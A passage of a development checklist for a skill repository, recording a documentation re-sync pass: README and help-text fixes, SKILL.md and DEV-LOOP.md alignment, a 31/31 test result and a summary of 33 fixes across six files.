- [x] **README build.sh step 4 didn't mention unpushed commit warning:** README said 'prints "Nothing to commit" and exits 0' but build.sh now checks for unpushed local commits and warns. → Fixed: added "and warns about any unpushed local commits" to step 4 description. (`README.md`)

- [x] **README skills directory auto-detection missing safety notes:** README listed the three auto-detection paths but didn't mention that `--skills-dir` rejects empty strings and system paths, or that the `$HOME` fallback requires HOME to be set. → Fixed: added parenthetical notes for path validation and HOME requirement. (`README.md`)

- [x] README accurately describes `tests/run-tests.sh` behavior — trap cleanup and cache dir cleanup are internal implementation details that don't change the user-facing description ("the temp dir is cleaned up"). No edit needed. ✓

- [x] README self-improvement loop section still accurate after all Pass 2 changes. ✓

### Re-check: help text vs behavior

- [x] `build.sh --help` output matches current behavior: lists all four flags (`--msg`, `--skills-dir`, `--no-commit`, `-h/--help`), describes auto-detection, shows commit format and examples. ✓
- [x] `run-tests.sh --help` output matches current behavior: lists all four flags (`--mode`, `--work-dir`, `-v/--verbose`, `-h/--help`). ✓
- [x] Header comments in both scripts match actual behavior (verified in Step 2, Pass 2; no changes since). ✓

### Re-check: SKILL.md vs DEV-LOOP.md

- [x] **SKILL.md missing trust boundaries mention:** DEV-LOOP.md now has a "Trust boundaries" subsection in "Before You Start" (added in 3E Fixes, Pass 2). SKILL.md's Key Rules had no mention of this. → Fixed: added a trust boundaries bullet to SKILL.md Key Rules. (`SKILL.md`)

- [x] SKILL.md correctly uses "Step 3E" (not "Phase E") — fixed in Step 3 Pass 2. ✓
- [x] SKILL.md's high-level summary of each step still accurately reflects DEV-LOOP.md. The new DEV-LOOP.md additions (Step 6 pass/fail criteria, 3E re-run guidance, expanded evaluator prompt) are implementation details appropriately covered only in the full protocol, not the summary. ✓

### Re-check: DEV-LOOP.md generic-ness

- [x] DEV-LOOP.md mentions `build.sh` only as illustrative examples with "e.g." framing (lines 84 and 94). No references to this repo's specific files, fixture, planted flaws, or test runner. Fully generic. ✓

### Test results

All 31 structural tests pass (0 failures).

### Verdict

Step 6 (Pass 2): **GREEN** — 4 doc mismatches found and fixed, all verified. No help text mismatches. SKILL.md/DEV-LOOP.md alignment confirmed. Tests pass.

## Summary (Pass 2)
- **Step 1:** 6 docs fixes (behavioral accuracy, F3b precision, self-improvement labels, STATUS.md conditionality)
- **Step 2:** 5 help text fixes (error messages, header comments, missing flags in usage lines)
- **Step 3 Phase A:** 6 code fixes (assert guard, empty --skills-dir, orphaned push, naming consistency, reporting template, evaluator prompt gaps)
- **Step 3 Phase B:** 0 cross-file fixes
- **Step 3E Adversarial:** 22 findings, 11 fixed (trust boundaries, trap cleanup, $HOME guard, protocol contradiction, stale files, Step 6 criteria, 3E code quality, path safety, cache cleanup, .gitignore) — 11 deferred as low/informational
- **Step 4:** Build green, 31/31 tests passed
- **Step 5:** No failures to fix
- **Step 6:** 5 re-sync fixes (README structure, build.sh docs, SKILL.md trust boundaries)
- **Total:** 33 fixes across 6 files (build.sh, tests/run-tests.sh, references/DEV-LOOP.md, SKILL.md, README.md, .gitignore)
